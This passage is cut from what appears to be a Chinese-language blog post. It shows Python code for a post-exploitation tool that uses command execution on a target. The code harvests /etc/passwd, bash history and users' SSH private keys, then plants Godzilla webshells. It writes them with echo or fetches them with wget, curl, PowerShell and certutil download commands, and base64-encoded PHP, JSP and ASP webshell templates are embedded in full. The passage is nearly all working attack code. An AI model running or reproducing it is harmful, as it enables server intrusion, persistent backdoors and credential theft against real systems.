class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;issue&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/etc/issue&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;/etc/issue&#x27;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;resolv.conf&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/etc/resolv.conf&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;/etc/resolv.conf&#x27;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;bash_history&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;~/.bash_history&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;~/.bash_history&#x27;</span>)&#125;,<br>    ])<br>    lines = passwd.splitlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> line <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> line:<br>            <span class="hljs-keyword">continue</span><br>        home_directory = line.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">5</span>]<br>        <span class="hljs-keyword">for</span> file_name <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;authorized_keys&#x27;</span>, <span class="hljs-string">&#x27;id_rsa&#x27;</span>, <span class="hljs-string">&#x27;id_rsa.pub&#x27;</span>, <span class="hljs-string">&#x27;known_hosts&#x27;</span>]:<br>            path = home_directory + <span class="hljs-string">&#x27;/.ssh/&#x27;</span> + file_name<br>            content = self.<span class="hljs-built_in">exec</span>(path)<br>            <span class="hljs-keyword">if</span> content:<br>                info.append(&#123;<span class="hljs-string">&quot;name&quot;</span>: path, <span class="hljs-string">&quot;path&quot;</span>: path, <span class="hljs-string">&quot;result&quot;</span>: content&#125;)<br>    <span class="hljs-keyword">return</span> info<br></code></pre></td></tr></table></figure>
+
+<h3 id="命令执行写webshell"><a href="#命令执行写webshell" class="headerlink" title="命令执行写webshell"></a>命令执行写webshell</h3><h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">escape_for_echo</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># windows 中使用 echo 的时候需要对特殊字符进行 ^ 转义处理</span><br>    special_chars = [<span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>]<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> special_chars:<br>        data = data.replace(char, <span class="hljs-string">f&#x27;^<span class="hljs-subst">&#123;char&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_os_type</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 获取操作系统类型</span><br>    whoami = self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;whoami&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> whoami:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;\\&quot;</span> <span class="hljs-keyword">in</span> whoami:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;windows&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_godzilla_webshell_by_echo</span>(<span class="hljs-params">self, webshell_content, save_path, webshell_url</span>):<br>    <span class="hljs-comment"># 通过 echo 写入哥斯拉 webshell 无回显不知道系统类型就都试一下</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> self.get_os_type() == <span class="hljs-string">&#x27;windows&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> self.get_os_type():<br>        webshell_content = escape_for_echo(webshell_content)<br>        self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">f&#x27;echo <span class="hljs-subst">&#123;webshell_content&#125;</span> &gt; <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>)<br>        flag = webshell_url <span class="hljs-keyword">if</span> check_url_by_status_code(webshell_url) <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (self.get_os_type() == <span class="hljs-string">&#x27;linux&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> self.get_os_type() ) <span class="hljs-keyword">and</span> flag != webshell_url:<br>        webshell_content = webshell_content.replace(<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>)<br>        webshell_content = webshell_content.replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)<br>        self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">f&#x27;echo &quot;<span class="hljs-subst">&#123;webshell_content&#125;</span>&quot; &gt; <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>)<br>        flag = webshell_url <span class="hljs-keyword">if</span> check_url_by_status_code(webshell_url) <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">return</span> flag<br></code></pre></td></tr></table></figure>
+
+<h4 id="远程下载webshell"><a href="#远程下载webshell" class="headerlink" title="远程下载webshell"></a>远程下载webshell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file_to_req</span>(<span class="hljs-params">self, download_url, save_path, req_url</span>):<br>    <span class="hljs-comment"># windows 、linux 下载远程 url 文件 ( webshell ) 并请求 =&gt; 请求成功就返回</span><br>    commands = self.get_download_commands(download_url=download_url, save_path=save_path)<br>    <span class="hljs-keyword">for</span> command <span class="hljs-keyword">in</span> commands:<br>        self.<span class="hljs-built_in">exec</span>(command)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">if</span> check_url_by_status_code(url=req_url):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_download_commands</span>(<span class="hljs-params">self, download_url, save_path</span>):<br>    <span class="hljs-comment"># 获取 windows、linux 的下载命令, 无法判断系统类型就都返回</span><br>    commands = &#123;<br>        <span class="hljs-string">&#x27;linux&#x27;</span>: [<br>            <span class="hljs-string">f&#x27;wget <span class="hljs-subst">&#123;download_url&#125;</span> -O <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>,<br>            <span class="hljs-string">f&#x27;curl <span class="hljs-subst">&#123;download_url&#125;</span> -o <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>,<br>        ],<br>        <span class="hljs-string">&#x27;windows&#x27;</span>: [<br>            <span class="hljs-string">f&#x27;curl <span class="hljs-subst">&#123;download_url&#125;</span> -o <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>,<br>            <span class="hljs-string">f&#x27;powershell.exe -Command &quot;Invoke-WebRequest -Uri <span class="hljs-subst">&#123;download_url&#125;</span> -OutFile <span class="hljs-subst">&#123;save_path&#125;</span>&quot;&#x27;</span>,<br>            <span class="hljs-string">f&#x27;powershell.exe -Command &quot;IEX(New-Object Net.WebClient).DownloadFile(\&#x27;<span class="hljs-subst">&#123;download_url&#125;</span>\&#x27;, <span class="hljs-subst">&#123;save_path&#125;</span>)&quot;&#x27;</span>,<br>            <span class="hljs-string">f&#x27;certutil.exe -urlcache -split -f <span class="hljs-subst">&#123;download_url&#125;</span> <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>,<br>        ]<br>    &#125;<br>    <span class="hljs-keyword">return</span> commands[<span class="hljs-string">&#x27;linux&#x27;</span>] + commands[<span class="hljs-string">&#x27;windows&#x27;</span>] <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.get_os_type() <span class="hljs-keyword">else</span> commands[self.get_os_type()]<br></code></pre></td></tr></table></figure>
+
+<h3 id="哥斯拉马生成"><a href="#哥斯拉马生成" class="headerlink" title="哥斯拉马生成"></a>哥斯拉马生成</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_webshell</span>(<span class="hljs-params"><span class="hljs-built_in">type</span></span>):<br>    webshell_content = &#123;<br>        <span class="hljs-string">&#x27;PHP&#x27;</span>:&#123;<br>            <span class="hljs-string">&#x27;payload&#x27;</span>: <span class="hljs-string">&#x27;PhpDynamicPayload&#x27;</span>,<br>            <span class="hljs-string">&#x27;cryption&#x27;</span>:  <span class="hljs-string">&#x27;PHP_XOR_BASE64&#x27;</span>,<br>            <span class="hljs-string">&#x27;content&#x27;</span>:<span class="hljs-string">b&#x27;PD9waHAKQHNlc3Npb25fc3RhcnQoKTsKQHNldF90aW1lX2xpbWl0KDApOwpAZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBlbmNvZGUoJEQsJEspewogICAgZm9yKCRpPTA7JGk8c3RybGVuKCREKTskaSsrKSB7CiAgICAgICAgJGMgPSAkS1skaSsxJjE1XTsKICAgICAgICAkRFskaV0gPSAkRFskaV1eJGM7CiAgICB9CiAgICByZXR1cm4gJEQ7Cn0KJHBhc3M9J3twYXNzfSc7CiRwYXlsb2FkTmFtZT0ncGF5bG9hZCc7CiRrZXk9J3tzZWNyZXRLZXl9JzsKaWYgKGlzc2V0KCRfUE9TVFskcGFzc10pKXsKICAgICRkYXRhPWVuY29kZShiYXNlNjRfZGVjb2RlKCRfUE9TVFskcGFzc10pLCRrZXkpOwogICAgaWYgKGlzc2V0KCRfU0VTU0lPTlskcGF5bG9hZE5hbWVdKSl7CiAgICAgICAgJHBheWxvYWQ9ZW5jb2RlKCRfU0VTU0lPTlskcGF5bG9hZE5hbWVdLCRrZXkpOwogICAgICAgIGlmIChzdHJwb3MoJHBheWxvYWQsImdldEJhc2ljc0luZm8iKT09PWZhbHNlKXsKICAgICAgICAgICAgJHBheWxvYWQ9ZW5jb2RlKCRwYXlsb2FkLCRrZXkpOwogICAgICAgIH0KCQlldmFsKCRwYXlsb2FkKTsKICAgICAgICBlY2hvIHN1YnN0cihtZDUoJHBhc3MuJGtleSksMCwxNik7CiAgICAgICAgZWNobyBiYXNlNjRfZW5jb2RlKGVuY29kZShAcnVuKCRkYXRhKSwka2V5KSk7CiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDE2KTsKICAgIH1lbHNlewogICAgICAgIGlmIChzdHJwb3MoJGRhdGEsImdldEJhc2ljc0luZm8iKSE9PWZhbHNlKXsKICAgICAgICAgICAgJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV09ZW5jb2RlKCRkYXRhLCRrZXkpOwogICAgICAgIH0KICAgIH0KfQo=&#x27;</span>,<br>        &#125;,<br>        <span class="hljs-string">&#x27;JSP&#x27;</span>:&#123;<br>            <span class="hljs-string">&#x27;payload&#x27;</span>: <span class="hljs-string">&#x27;JavaDynamicPayload&#x27;</span>,<br>            <span class="hljs-string">&#x27;cryption&#x27;</span>: <span class="hljs-string">&#x27;JAVA_AES_BASE64&#x27;</span>,<br>            <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">b&#x27;PCUhIFN0cmluZyB4YyA9ICJ7c2VjcmV0S2V5fSI7CiAgICBTdHJpbmcgcGFzcyA9ICJ7cGFzc30iOwogICAgU3RyaW5nIG1kNSA9IG1kNShwYXNzICsgeGMpOwoKICAgIGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlciB7CiAgICAgICAgcHVibGljIFgoQ2xhc3NMb2FkZXIgeikgewogICAgICAgICAgICBzdXBlcih6KTsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBDbGFzcyBRKGJ5dGVbXSBjYikgewogICAgICAgICAgICByZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7CiAgICAgICAgfQogICAgfQoKICAgIHB1YmxpYyBieXRlW10KICAgIHgoYnl0ZVtdIHMsIGJvb2xlYW4gbSkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGphdmF4LmNyeXB0by5DaXBoZXIgYyA9IGphdmF4LmNyeXB0by5DaXBoZXIuZ2V0SW5zdGFuY2UoIkFFUyIpOwogICAgICAgICAgICBjLmluaXQobSA/IDEgOiAyLCBuZXcKICAgICAgICAgICAgICAgICAgICBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksICJBRVMiKSk7CiAgICAgICAgICAgIHJldHVybiBjLmRvRmluYWwocyk7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgICAgfQogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgU3RyaW5nIG1kNShTdHJpbmcgcykgewogICAgICAgIFN0cmluZyByZXQgPSBudWxsOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGphdmEuc2VjdXJpdHkuTWVzc2FnZURpZ2VzdAogICAgICAgICAgICAgICAgICAgIG07CiAgICAgICAgICAgIG0gPSBqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QuZ2V0SW5zdGFuY2UoIk1ENSIpOwogICAgICAgICAgICBtLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpOwogICAgICAgICAgICByZXQgPSBuZXcKICAgICAgICAgICAgICAgICAgICBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgIH0KICAgICAgICByZXR1cm4gcmV0OwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIENsYXNzIGJhc2U2NDsKICAgICAgICBTdHJpbmcgdmFsdWUgPSBudWxsOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGJhc2U2NCA9IENsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTsKICAgICAgICAgICAgT2JqZWN0IEVuY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXRFbmNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwKICAgICAgICAgICAgICAgICAgICBudWxsKTsKICAgICAgICAgICAgdmFsdWUgPSAoU3RyaW5nKSBFbmNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJlbmNvZGVUb1N0cmluZyIsIG5ldyBDbGFzc1tde2J5dGVbXS5jbGFzc30pLmludm9rZShFbmNvZGVyLCBuZXcKICAgICAgICAgICAgICAgICAgICBPYmplY3RbXXtic30pOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBiYXNlNjQgPSBDbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjRFbmNvZGVyIik7CiAgICAgICAgICAgICAgICBPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOwogICAgICAgICAgICAgICAgdmFsdWUgPSAoU3RyaW5nKSBFbmNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJlbmNvZGUiLCBuZXcgQ2xhc3NbXXtieXRlW10uY2xhc3MKICAgICAgICAgICAgICAgIH0pLmludm9rZShFbmNvZGVyLCBuZXcgT2JqZWN0W117YnN9KTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUyKSB7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHZhbHVlOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdCiAgICBiYXNlNjREZWNvZGUoU3RyaW5nIGJzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBDbGFzcyBiYXNlNjQ7CiAgICAgICAgYnl0ZVtdIHZhbHVlID0gbnVsbDsKICAgICAgICB0cnkgewogICAgICAgICAgICBiYXNlNjQgPSBDbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7CiAgICAgICAgICAgIE9iamVjdCBkZWNvZGVyID0gYmFzZTY0LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIsIG51bGwpLmludm9rZShiYXNlNjQsCiAgICAgICAgICAgICAgICAgICAgbnVsbCk7CiAgICAgICAgICAgIHZhbHVlID0gKGJ5dGVbXSkgZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSkuaW52b2tlKGRlY29kZXIsIG5ldwogICAgICAgICAgICAgICAgICAgIE9iamVjdFtde2JzfSk7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGJhc2U2NCA9IENsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsKICAgICAgICAgICAgICAgIE9iamVjdAogICAgICAgICAgICAgICAgICAgICAgICBkZWNvZGVyID0gYmFzZTY0Lm5ld0luc3RhbmNlKCk7CiAgICAgICAgICAgICAgICB2YWx1ZSA9IChieXRlW10pIGRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tde1N0cmluZy5jbGFzcwogICAgICAgICAgICAgICAgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXXtic30pOwogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZTIpIHsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdmFsdWU7CiAgICB9JT4KPCUKICAgIHRyeSB7CiAgICAgICAgYnl0ZVtdIGRhdGEgPSBiYXNlNjREZWNvZGUocmVxdWVzdC5nZXRQYXJhbWV0ZXIocGFzcykpOwogICAgICAgIGRhdGEgPSB4KGRhdGEsIGZhbHNlKTsKICAgICAgICBpZgogICAgICAgIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpID09IG51bGwpIHsKICAgICAgICAgICAgc2Vzc2lvbi5zZXRBdHRyaWJ1dGUoInBheWxvYWQiLCBuZXcKICAgICAgICAgICAgICAgICAgICBYKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5RKGRhdGEpKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXF1ZXN0LnNldEF0dHJpYnV0ZSgicGFyYW1ldGVycyIsIGRhdGEpOwogICAgICAgICAgICBqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbQogICAgICAgICAgICAgICAgICAgIGFyck91dCA9IG5ldyBqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSgpOwogICAgICAgICAgICBPYmplY3QKICAgICAgICAgICAgICAgICAgICBmID0gKChDbGFzcykgc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInBheWxvYWQiKSkubmV3SW5zdGFuY2UoKTsKICAgICAgICAgICAgZi5lcXVhbHMoYXJyT3V0KTsKICAgICAgICAgICAgZi5lcXVhbHMocGFnZUNvbnRleHQpOwogICAgICAgICAgICByZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDAsIDE2KSk7CiAgICAgICAgICAgIGYudG9TdHJpbmcoKTsKICAgICAgICAgICAgcmVzcG9uc2UuZ2V0V3JpdGVyKCkud3JpdGUoYmFzZTY0RW5jb2RlKHgoYXJyT3V0LnRvQnl0ZUFycmF5KCksCiAgICAgICAgICAgICAgICAgICAgdHJ1ZSkpKTsKICAgICAgICAgICAgcmVzcG9uc2UuZ2V0V3JpdGVyKCkud3JpdGUobWQ1LnN1YnN0cmluZygxNikpOwogICAgICAgIH0KICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICB9CiU+&#x27;</span>,<br>        &#125;,<br>        <span class="hljs-string">&#x27;ASP&#x27;</span>:&#123;<br>            <span class="hljs-string">&#x27;payload&#x27;</span>: <span class="hljs-string">&#x27;AspDynamicPayload&#x27;</span>,<br>            <span class="hljs-string">&#x27;cryption&#x27;</span>: <span class="hljs-string">&#x27;ASP_XOR_BASE64&#x27;</span>,<br>            <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">b&#x27;PCUKU2V0IGJ5cGFzc0RpY3Rpb25hcnkgPSBTZXJ2ZXIuQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRGljdGlvbmFyeSIpCgpGdW5jdGlvbiBCYXNlNjREZWNvZGUoQnlWYWwgdkNvZGUpCiAgICBEaW0gb1hNTCwgb05vZGUKICAgIFNldCBvWE1MID0gQ3JlYXRlT2JqZWN0KCJNc3htbDIuRE9NRG9jdW1lbnQuMy4wIikKICAgIFNldCBvTm9kZSA9IG9YTUwuQ3JlYXRlRWxlbWVudCgiYmFzZTY0IikKICAgIG9Ob2RlLmRhdGFUeXBlID0gImJpbi5iYXNlNjQiCiAgICBvTm9kZS50ZXh0ID0gdkNvZGUKICAgIEJhc2U2NERlY29kZSA9IG9Ob2RlLm5vZGVUeXBlZFZhbHVlCiAgICBTZXQgb05vZGUgPSBOb3RoaW5nCiAgICBTZXQgb1hNTCA9IE5vdGhpbmcKRW5kIEZ1bmN0aW9uCgpGdW5jdGlvbiBkZWNyeXB0aW9uKGNvbnRlbnQsaXNCaW4pCiAgICBkaW0gc2l6ZSxpLHJlc3VsdCxrZXlTaXplCiAgICBrZXlTaXplID0gbGVuKGtleSkKICAgIFNldCBCaW5hcnlTdHJlYW0gPSBDcmVhdGVPYmplY3QoIkFET0RCLlN0cmVhbSIpCiAgICBCaW5hcnlTdHJlYW0uQ2hhclNldCA9ICJpc28tODg1OS0xIgogICAgQmluYXJ5U3RyZWFtLlR5cGUgPSAyCiAgICBCaW5hcnlTdHJlYW0uT3BlbgogICAgaWYgSXNBcnJheShjb250ZW50KSB0aGVuCiAgICAgICAgc2l6ZT1VQm91bmQoY29udGVudCkrMQogICAgICAgIEZvciBpPTEgVG8gc2l6ZQogICAgICAgICAgICBCaW5hcnlTdHJlYW0uV3JpdGVUZXh0IGNocncoYXNjYihtaWRiKGNvbnRlbnQsaSwxKSkgWG9yIEFzYyhNaWQoa2V5LChpIG1vZCBrZXlTaXplKSsxLDEpKSkKICAgICAgICBOZXh0CiAgICBlbmQgaWYKICAgIEJpbmFyeVN0cmVhbS5Qb3NpdGlvbiA9IDAKICAgIGlmIGlzQmluIHRoZW4KICAgICAgICBCaW5hcnlTdHJlYW0uVHlwZSA9IDEKICAgICAgICBkZWNyeXB0aW9uPUJpbmFyeVN0cmVhbS5SZWFkKCkKICAgIGVsc2UKICAgICAgICBkZWNyeXB0aW9uPUJpbmFyeVN0cmVhbS5SZWFkVGV4dCgpCiAgICBlbmQgaWYKCkVuZCBGdW5jdGlvbgogICAga2V5PSJ7c2VjcmV0S2V5fSIKICAgIGNvbnRlbnQ9cmVxdWVzdC5Gb3JtKCJ7cGFzc30iKQogICAgaWYgbm90IElzRW1wdHkoY29udGVudCkgdGhlbgoKICAgICAgICBpZiAgSXNFbXB0eShTZXNzaW9uKCJwYXlsb2FkIikpIHRoZW4KICAgICAgICAgICAgY29udGVudD1kZWNyeXB0aW9uKEJhc2U2NERlY29kZShjb250ZW50KSxmYWxzZSkKICAgICAgICAgICAgU2Vzc2lvbigicGF5bG9hZCIpPWNvbnRlbnQKICAgICAgICAgICAgcmVzcG9uc2UuRW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBjb250ZW50PWRlY3J5cHRpb24oQmFzZTY0RGVjb2RlKGNvbnRlbnQpLHRydWUpCiAgICAgICAgICAgIGJ5cGFzc0RpY3Rpb25hcnkuQWRkICJwYXlsb2FkIixTZXNzaW9uKCJwYXlsb2FkIikKICAgICAgICAgICAgRXhlY3V0ZShieXBhc3NEaWN0aW9uYXJ5KCJwYXlsb2FkIikpCiAgICAgICAgICAgIHJlc3VsdD1ydW4oY29udGVudCkKICAgICAgICAgICAgcmVzcG9uc2UuV3JpdGUoIntmaW5kU3RyTGVmdH0iKQogICAgICAgICAgICBpZiBub3QgSXNFbXB0eShyZXN1bHQpIHRoZW4KICAgICAgICAgICAgICAgIHJlc3BvbnNlLldyaXRlIEJhc2U2NEVuY29kZShkZWNyeXB0aW9uKHJlc3VsdCx0cnVlKSkKICAgICAgICAgICAgZW5kIGlmCiAgICAgICAgICAgIHJlc3BvbnNlLldyaXRlKCJ7ZmluZFN0clJpZ2h0fSIpCiAgICAgICAgZW5kIGlmCiAgICBlbmQgaWYKJT4K&#x27;</span>,<br>        &#125;,<br>    &#125;<br>    password = random_str(<span class="hljs-number">4</span>)<br>    key = random_str(<span class="hljs-number">8</span>)<br>    secretKey = hashlib.md5(key.encode()).hexdigest()[:<span class="hljs-number">16</span>]<br>    findStrMd5 = hashlib.md5((password + secretKey).encode()).hexdigest()<br>    content = base64.b64decode(webshell_content[<span class="hljs-built_in">type</span>][<span class="hljs-string">&#x27;content&#x27;</span>]).decode()<br>    content = content.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>)<br>    content = content.replace(<span class="hljs-string">&#x27;&#123;pass&#125;&#x27;</span>, password)<br>    content = content.replace(<span class="hljs-string">&#x27;&#123;secretKey&#125;&#x27;</span>, secretKey)<br>    content = content.replace(<span class="hljs-string">&#x27;&#123;findStrLeft&#125;&#x27;</span>, findStrMd5[<span class="hljs-number">0</span>: <span class="hljs-number">6</span>])<br>    content = content.replace(<span class="hljs-string">&#x27;&#123;findStrRight&#125;&#x27;</span>, findStrMd5[<span class="hljs-number">20</span>: <span class="hljs-number">26</span>])<br>    webshell = &#123;&#125;<br>    webshell[<span class="hljs-string">&#x27;payload&#x27;</span>] = webshell_content[<span class="hljs-built_in">type</span>][<span class="hljs-string">&#x27;payload&#x27;</span>]<br>    webshell[<span class="hljs-string">&#x27;cryption&#x27;</span>] = webshell_content[<span 